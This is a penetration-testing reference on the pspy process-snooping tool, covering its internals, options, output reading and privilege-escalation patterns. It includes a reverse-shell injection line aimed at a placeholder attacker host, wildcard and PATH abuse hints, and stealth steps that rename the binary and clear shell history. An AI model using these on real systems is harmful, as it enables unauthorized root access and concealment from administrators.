# pspy Techniques and Internals

## How pspy Works

### Architecture Overview

pspy operates without requiring root privileges by combining two Linux kernel features:

1. **inotify Watchers** - Monitor filesystem events
2. **procfs Scanning** - Read process information from `/proc`

### The Detection Mechanism

#### Step 1: Filesystem Event Monitoring (inotify)

pspy sets up inotify watchers on directories commonly accessed during process execution:

```
Default watched directories:
/usr, /tmp, /etc, /home, /var, /opt
```

When any file is accessed, modified, or created in these directories, inotify triggers an event notification.

#### Step 2: Process Scanning (procfs)

Upon receiving an inotify event, pspy immediately scans `/proc` to capture:

```
/proc/[PID]/cmdline    - Full command line with arguments
/proc/[PID]/stat       - Process status (UID, state, parent PID)
/proc/[PID]/environ    - Environment variables (requires same UID or root)
```

#### Step 3: Timed Polling

In addition to event-triggered scans, pspy performs regular procfs scans at a configurable interval (default: 100ms). This catches processes that:

- Don't trigger filesystem events in watched directories
- Execute too quickly between inotify and scan

### Why It Works Without Root

```
Key insight: /proc/[PID]/cmdline is world-readable for all processes
```

Even as an unprivileged user, you can read:
- Command lines of ALL processes (including root's)
- Process IDs and parent relationships
- Process state and timing

The inotify watchers work on directories you have read access to, and most common execution paths (`/usr/bin`, `/tmp`, etc.) are world-readable.

### Limitations

| Limitation | Explanation |
|------------|-------------|
| Very fast processes | May complete between scans |
| No inotify trigger | Processes not touching watched dirs may be missed |
| Environment variables | Only readable for your own UID |
| Kernel threads | May not appear in procfs the same way |

---

## Version Differences

### Binary Variants

| Binary | Arch | Size | Linking | Notes |
|--------|------|------|---------|-------|
| `pspy64` | x86_64 | ~4MB | Static | Works on any 64-bit Linux |
| `pspy32` | x86 | ~4MB | Static | Works on any 32-bit Linux |
| `pspy64s` | x86_64 | ~1MB | Dynamic | UPX compressed, needs glibc |
| `pspy32s` | x86 | ~1MB | Dynamic | UPX compressed, needs glibc |

### Which Version to Use

**Use static binaries (`pspy64`/`pspy32`) when:**
- Target has non-standard libc (musl, old glibc)
- Containers or minimal environments
- You need guaranteed compatibility

**Use small binaries (`pspy64s`/`pspy32s`) when:**
- Limited disk space on target
- Slow network transfer
- Target has standard glibc

**Architecture detection:**
```bash
# Check target architecture
uname -m
# x86_64 = use pspy64/pspy64s
# i686/i386 = use pspy32/pspy32s

# Check if dynamic linking works
ldd /bin/ls 2>/dev/null && echo "Dynamic OK" || echo "Use static"
```

---

## Command Line Options Reference

### Process and Event Control

| Option | Default | Description |
|--------|---------|-------------|
| `-p` | true | Print commands to stdout |
| `-f` | false | Print file system events to stdout |
| `-c` | false | Color output by UID (different users = different colors) |

### Timing Configuration

| Option | Default | Description |
|--------|---------|-------------|
| `-i <ms>` | 100 | Procfs scan interval in milliseconds |

**Tuning guidance:**
```bash
# Fast scanning for catching quick processes (more CPU)
./pspy64 -i 50

# Balanced scanning (default)
./pspy64 -i 100

# Slow scanning for long-running monitoring (less CPU)
./pspy64 -i 1000
```

### Directory Watching

| Option | Description |
|--------|-------------|
| `-r <dir>` | Watch directory recursively (can be repeated) |
| `-d <dir>` | Watch directory non-recursively (can be repeated) |

**Custom directory monitoring:**
```bash
# Focus on cron-related directories
./pspy64 -r /etc/cron.d -r /etc/cron.daily -r /var/spool/cron

# Watch user directories
./pspy64 -r /home -r /root

# Watch common script locations
./pspy64 -r /opt -r /usr/local/bin -r /var/scripts
```

### Debugging

| Option | Description |
|--------|-------------|
| `--debug` | Print verbose error messages |

---

## Output Interpretation

### Output Format

```
TIMESTAMP CMD: UID=USER_ID PID=PROCESS_ID | COMMAND_LINE
```

### Understanding the Fields

| Field | Meaning | Example |
|-------|---------|---------|
| Timestamp | When process was detected | `2024/01/15 03:01:01` |
| UID | Numeric user ID running process | `UID=0` (root), `UID=1000` (user) |
| PID | Process ID | `PID=12345` |
| Command | Full command line with arguments | `/bin/sh -c /opt/backup.sh` |

### Common UID Values

```
UID=0     - root
UID=33    - www-data (Debian/Ubuntu)
UID=48    - apache (RHEL/CentOS)
UID=65534 - nobody
UID=1000+ - Regular users
```

### Event Types (with -f flag)

```
FS:OPEN      - File opened for reading
FS:ACCESS    - File accessed
FS:CLOSE     - File closed
FS:MODIFY    - File modified
FS:ATTRIB    - File attributes changed
FS:CREATE    - File created
FS:DELETE    - File deleted
```

### Sample Output Analysis

```
2024/01/15 03:01:01 CMD: UID=0  PID=1234  | /usr/sbin/CRON -f
2024/01/15 03:01:01 CMD: UID=0  PID=1235  | /bin/sh -c /opt/scripts/backup.sh
2024/01/15 03:01:01 CMD: UID=0  PID=1236  | /bin/bash /opt/scripts/backup.sh
2024/01/15 03:01:02 CMD: UID=0  PID=1237  | tar -czf /backup/files.tar.gz /var/www
```

**Analysis:**
1. Cron daemon spawned (`CRON -f`)
2. Cron executed shell to run a script
3. Script uses bash
4. Script runs tar as root

**Privilege escalation angle:** If `/opt/scripts/backup.sh` is writable by your user, you can inject commands that run as root.

---

## Privilege Escalation Patterns

### Pattern 1: Writable Scripts Called by Root

Look for:
```
CMD: UID=0 | /bin/sh -c /path/to/script.sh
CMD: UID=0 | /bin/bash /some/script
CMD: UID=0 | python3 /opt/automation/task.py
```

Check if writable:
```bash
ls -la /path/to/script.sh
# If you can write, inject: bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
```

### Pattern 2: Relative Paths in Root Processes

Look for:
```
CMD: UID=0 | ./run_task.sh
CMD: UID=0 | program_name (no absolute path)
```

Exploit via PATH manipulation if you control CWD or PATH.

### Pattern 3: Credentials in Command Lines

Look for:
```
CMD: UID=0 | mysql -u admin -pSecretPassword123
CMD: UID=0 | curl -u user:pass https://...
CMD: UID=0 | sshpass -p 'password' ssh user@host
```

### Pattern 4: Temporary File Usage

Look for:
```
CMD: UID=0 | /bin/sh /tmp/somescript
CMD: UID=0 | cat /tmp/config > /etc/important
```

Race condition opportunity if you can predict/control temp files.

### Pattern 5: Wildcard Injection

Look for:
```
CMD: UID=0 | tar czf backup.tar.gz *
CMD: UID=0 | chown user:user *
CMD: UID=0 | rsync -a * /backup/
```

Exploit via files named like command options.

---

## Best Practices for Monitoring

### Long-Term Monitoring

```bash
# Run in background, save to file
./pspy64 -pfc > /tmp/.pspy.log 2>&1 &

# Monitor for specific time (1 hour)
timeout 3600 ./pspy64 -c > /tmp/pspy_1hr.log

# Run in tmux/screen for persistence
tmux new -d -s pspy './pspy64 -pfc'
```

### Targeted Monitoring

```bash
# Focus on cron (every minute, check for 2-3 minutes)
./pspy64 -i 500 | tee pspy.log

# Focus on specific user directories
./pspy64 -r /home/targetuser -r /var/mail

# High-speed scanning for fast processes
./pspy64 -i 10 -r /tmp
```

### Stealth Considerations

```bash
# Rename binary
cp pspy64 /tmp/.update-check

# Use small binary to reduce transfer time
# pspy64s is ~1MB vs ~4MB

# Clean up after
rm /tmp/pspy64; history -c
```
